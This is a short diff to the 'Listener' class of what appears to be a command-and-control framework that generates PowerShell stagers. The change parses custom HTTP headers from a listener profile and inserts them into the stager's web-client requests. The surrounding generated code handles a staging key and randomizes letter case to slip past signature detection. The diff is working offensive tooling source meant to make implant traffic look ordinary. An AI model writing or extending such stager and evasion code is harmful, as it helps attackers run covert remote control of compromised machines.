@@ -134,7 +134,8 @@ class Listener:
             profile = listenerOptions['DefaultProfile']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
-
+            customHeaders = profile.split('|')[2:]
+            
             if language.startswith('po'):
                 # PowerShell
 
@@ -181,6 +182,14 @@ class Listener:
 
                 # TODO: reimplement stager retries?
 
+                #Add custom headers if any
+                if customHeaders != []:
+                    for header in customHeaders:
+                        headerKey = header.split(':')[0]
+                        headerValue = header.split(':')[1]
+                        stager += helpers.randomize_capitalization("$wc.Headers.Add(")
+                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
+                        
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                 stager += "'%s');" % (stagingKey)
